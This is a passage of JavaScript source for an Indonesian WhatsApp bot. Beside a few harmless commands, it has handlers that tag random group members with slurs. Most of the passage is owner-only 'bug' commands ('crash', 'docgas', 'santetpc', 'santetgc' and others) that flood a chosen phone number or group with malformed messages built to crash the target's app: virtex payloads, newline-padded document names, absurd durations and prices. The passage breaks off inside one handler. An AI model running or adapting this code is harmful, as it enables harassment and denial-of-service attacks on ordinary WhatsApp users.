					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡════�? Cek Sifat @${bet.split('@')[0]} 》════≡*

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%

*≡═════�? CEKSIFATME 》═════�?*`
					buff = await getBuffer(ppimg)
GpStore.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${prefix+command}*`)
let media = await GpStore.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
GpStore.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyaimg, 
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hai Kak ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyaimg,
"mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
"sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
}}
}, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'sticker': 
case 's': {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await GpStore.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await GpStore.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'peak':
case 'pantex':
case 'pantek':
case 'setan':
case 'iblis':
case 'cacat':
case 'yatim':
case 'piatu':
{
if (!m.isGroup) return reply(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
GpStore.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
}
break
case 'goblokcek':
case 'jelekcek':
case 'gaycek':
case 'rate':
case 'lesbicek':
case 'gantengcek':
case 'cantikcek':
case 'begocek':
case 'suhucek':
case 'pintercek':
case 'jagocek':
case 'nolepcek':
case 'babicek':
case 'bebancek':
case 'baikcek':
case 'jahatcek':
case 'anjingcek':
case 'haramcek':
case 'pakboycek':
case 'pakgirlcek':
case 'sangecek':
case 'bapercek':
case 'fakboycek':
case 'alimcek':
case 'suhucek':
case 'fakgirlcek':
case 'kerencek':
case 'wibucek':
case 'pasarkascek':
case 'kulcek':                
case 'cekgoblok':
case 'cekjelek':
case 'cekgay':                
case 'ceklesbi':
case 'cekganteng':
case 'cekcantik':
case 'cekbego':
case 'ceksuhu':
case 'cekpinter':
case 'cekjago':
case 'ceknolep':
case 'cekbabi':
case 'cekbeban':
case 'cekbaik':
case 'cekjahat':
case 'cekanjing':
case 'cekharam':
case 'cekpakboy':
case 'cekpakgirl':
case 'ceksange':
case 'cekbaper':
case 'cekfakboy':
case 'cekalim':
case 'ceksuhu':
case 'cekfakgirl':
case 'cekkeren':
case 'cekwibu':
case 'cekpasarkas':
case 'cekkul':
if (!m.isGroup) return reply(mess.group)
const cex = body.slice(0)
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'cekbapak':
if (!m.isGroup) return reply(mess.group)
const cek = bapak[Math.floor(Math.random() * bapak.length)]
reply(cek)
break
case 'obfus':{
if (!q) return reply(`Contoh ${prefix+command} const kirbotz = require('kirbotz-api')`)
let meg = await obfus(q)
reply(`Sukses
${meg.result}`)
}
break
case 'styletext':{
if (!q) return reply(`Contoh ${prefix+command} akira`)
let res = await styletext(q)
reply(util.format(res))
}
break
case 'vote': {
if (!itsMeGpStore) return reply(mess.owner)
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO SAYA GpStore BOT",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI GpStore BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: crsh })
GpStore.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
reply(mess.succes)
}
break
case 'send':{
if (!q) return reply(`Penggunaan ${prefix+command} 6285842107854`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'crash':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyaimg},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'jagoan' : {
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
GpStore.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestmentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku GpStore', 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `GpStore Bot ${virus}${virtex(prefix)}`,
"body": `GpStore Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `GpStore Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyaimg, 
thumbnail: ppnyaimg,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'jagoanneon' : {
if (!itsMeGpStore) return reply(mess.owner)
GpStore.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestmentMessage: { 
Message: { 
extendedTextMessage: { 
text: `GpStore Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `GpStore Bot`,
"body": `Masih Bawahan`,
mimetype: 'audio/mpeg', 
caption: `GpStore Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyaimg, 
thumbnail: ppnyaimg,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'locgas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `GpStore Bot ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `GpStore Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
GpStore.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'teksgas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.relayMessage(num, {
requestmentMessage: { 
Message: { 
extendedTextMessage: { 
text: `GpStore Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyaimg }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'vngas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'kongas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendContact(num, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'docgas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(num, { 
document: ppnyaimg, 
fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyaimg, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'stickgas':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(num, {sticker: ppnyaimg},{ quoted: lep })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'itemgas': {
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'cataloggas': {
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `GpStore Bot WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/62858428854987`
},
"businessOwnerJid": "62858428854987@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
GpStore.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'kaylog':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `GpStore Bot WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/62858428854987`
},
"businessOwnerJid": "62858428854987@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
GpStore.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayloc':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `GpStore Bot ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `GpStore Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: m.chat, quoted: lep })
GpStore.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaykontak':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendContact(m.chat, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayitem':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaystick':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(m.chat, {sticker: ppnyaimg},{ quoted: lep })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kaydoc':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(m.chat, { 
document: ppnyaimg, 
fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyaimg, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:gifes})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayvn':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'kayteks':{
if (!itsMeGpStore) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
GpStore.relayMessage(m.chat, {
requestmentMessage: { 
Message: { 
extendedTextMessage: { 
text: `GpStore Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyaimg }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'santedparah': 
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let hdhe = await GpStore.onWhatsApp(nmn)
if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
santed(bygbt, nmn, sender)
break
case 'santetpc':
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6281297970769`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let kgdhwus = await GpStore.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
GpStore.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Sukses`)
break
case 'santetgc':
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let resultny = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await GpStore.groupAcceptInvite(resultny)
GpStore.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Sukses`)
break
case 'spambugvip':{
if (!itsMeGpStore) return reply(mess.owner)
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let cekno = await GpStore.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
if (isNaN(jumlah)) return reply(`Harus berupa angka`)
